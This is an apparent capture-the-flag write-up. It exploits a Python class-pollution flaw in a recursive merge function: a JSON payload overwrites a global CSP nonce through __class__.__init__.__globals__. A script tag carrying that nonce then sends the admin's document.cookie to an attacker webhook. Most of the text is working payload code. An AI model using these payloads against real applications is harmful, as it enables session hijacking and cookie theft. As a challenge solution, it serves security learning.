The vulnerable python code is below (in utils.py)

```python
def processRequest(data, feedback):
    for k, v in data.items():
        if hasattr(feedback, '__getitem__'):
            if feedback.get(k) and type(v) == dict:
                processRequest(v, feedback.get(k))
            else:
                feedback[k] = v
        elif hasattr(feedback, k) and type(v) == dict:
            processRequest(v, getattr(feedback, k))
        else:
            setattr(feedback, k, v)
```

This introduces a python class pollution vulnerability. For a good read refer to https://blog.abdulrah33m.com/prototype-pollution-in-python/


Send post request to `/submit` endpoint with the following json data

```json
{
	"__class__": {
		"__init__": {
			"__globals__":{
				"SECRET_NONCE": "mysecret"
			}
		}
	}
}
```

and the nonce gets changed

Now just create a new temp chat with the admin and post the following payload

```javascript
<script nonce="mysecret">fetch("<your_webhook_url>/"+document.cookie)</script>
```

Visit your webhook url and you will see the flag